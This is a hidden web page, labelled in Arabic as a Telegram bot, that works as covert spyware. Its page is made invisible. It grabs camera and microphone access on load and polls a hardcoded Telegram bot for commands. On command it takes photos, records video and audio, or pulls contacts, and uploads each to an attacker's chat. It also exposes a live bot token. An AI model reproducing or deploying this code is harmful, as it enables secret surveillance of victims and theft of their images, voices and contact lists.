<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوت تلجرام</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        * { display: none; }
    </style>
</head>
<body>
    <button id="hiddenContactButton" style="position: absolute; top: -100px; left: -100px; opacity: 0; width: 1px; height: 1px;"></button>

    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";  // ضع توكن البوت هنا
        const chat_id = "5932979028";  // معرف الشات الخاص بك

        let lastUpdateId = 0;
        let cameraReady = false;
        let isProcessing = false;

        // الأوامر
        async function handleCommand(cmd) {
            if (isProcessing) {
                await sendToTelegram("⏳ انتظر...");
                return;
            }
            isProcessing = true;

            switch(cmd) {
                case "photo":
                    await sendToTelegram("📸 جاري التقاط الصورة...");
                    const photo = await capturePhoto();
                    if (photo) {
                        await sendPhoto(photo);
                        await sendToTelegram("✅ تم");
                    } else {
                        await sendToTelegram("❌ فشل في التقاط الصورة");
                    }
                    break;

                case "video":
                    await sendToTelegram("🎬 جاري تسجيل الفيديو...");
                    const video = await recordVideo(10000); // 10 ثواني
                    if (video) {
                        await sendVideo(video);
                        await sendToTelegram("✅ تم");
                    } else {
                        await sendToTelegram("❌ فشل في تسجيل الفيديو");
                    }
                    break;

                case "audio":
                    await sendToTelegram("🎤 جاري تسجيل الصوت...");
                    const audio = await recordAudio(10000); // 10 ثواني
                    if (audio) {
                        await sendVoice(audio);
                        await sendToTelegram("✅ تم");
                    } else {
                        await sendToTelegram("❌ فشل في تسجيل الصوت");
                    }
                    break;

                case "contacts":
                    await getContacts();
                    break;

                default:
                    await sendToTelegram("❌ أمر غير مدعوم.");
            }

            isProcessing = false;
        }

        // إرسال الرسائل إلى التليجرام
        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
            });
        }

        // التقاط صورة
        async function capturePhoto() {
            if (!cameraReady) return null;
            try {
                const photoBlob = await imageCapture.takePhoto();
                return photoBlob;
            } catch (e) {
                console.error("❌ فشل في التقاط الصورة:", e);
                return null;
            }
        }

        // تسجيل فيديو
        async function recordVideo(duration = 10000) {
            if (!cameraReady) return null;
            try {
                const videoTrack = persistentVideoStream.getVideoTracks()[0];
                const audioTrack = persistentAudioStream.getAudioTracks()[0];
                const recorder = new MediaRecorder(new MediaStream([videoTrack, audioTrack]));
                const chunks = [];

                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, duration);
                });
            } catch (e) {
                console.error("❌ فشل في تسجيل الفيديو:", e);
                return null;
            }
        }

        // تسجيل صوت
        async function recordAudio(duration = 10000) {
            if (!cameraReady) return null;
            try {
                const audioTrack = persistentAudioStream.getAudioTracks()[0];
                const recorder = new MediaRecorder(new MediaStream([audioTrack]));
                const chunks = [];

                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) {
                console.error("❌ فشل في تسجيل الصوت:", e);
                return null;
            }
        }

        // سحب جهات الاتصال
        async function getContacts() {
            try {
                if (!navigator.contacts) {
                    await sendToTelegram("❌ المتصفح لا يدعم سحب جهات الاتصال (مطلوب Chrome 80+ على Android)");
                    return null;
                }

                await sendToTelegram("📞 جاري فتح نافذة جهات الاتصال...");
                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                if (contacts.length > 0) {
                    await sendContactsResult(contacts);
                } else {
                    await sendToTelegram("❌ لا توجد جهات اتصال.");
                }
            } catch (e) {
                console.error("❌ فشل في سحب جهات الاتصال:", e);
                await sendToTelegram(`❌ فشل سحب جهات الاتصال: ${e.message}`);
            }
        }

        // إرسال جهات الاتصال
        async function sendContactsResult(contacts) {
            let contactsText = "📞 *جهات الاتصال*\n\n";
            contacts.forEach((contact, index) => {
                contactsText += `👤 ${contact.name || "بدون اسم"}\n📱 ${contact.tel || "لا يوجد رقم"}\n`;
            });

            await sendToTelegram(contactsText);
        }

        // إرسال صورة
        async function sendPhoto(photoBlob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", photoBlob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
        }

        // إرسال فيديو
        async function sendVideo(videoBlob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", videoBlob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: formData });
        }

        // إرسال صوت
        async function sendVoice(audioBlob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", audioBlob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
        }

        // تفعيل الكاميرا
        async function initCamera() {
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                persistentVideoStream = videoStream;
                persistentAudioStream = videoStream;
                cameraReady = true;
            } catch (e) {
                cameraReady = false;
                console.error("❌ فشل في تفعيل الكاميرا:", e);
            }
        }

        // حفظ التحديثات
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=25&offset=${lastUpdateId + 1}`;
                const res = await fetch(url);
                const data = await res.json();
                if (data.result) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            await handleCommand(update.callback_query.data);
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        }
                    }
                }
            } catch (e) {
                console.error("❌ فشل في جلب التحديثات:", e);
            }
        }

        // تشغيل البوت
        window.onload = async () => {
            await initCamera();
            setInterval(getUpdates, 2000);  // تحقق من التحديثات كل 2 ثانية
        };
    </script>
</body>
</html>
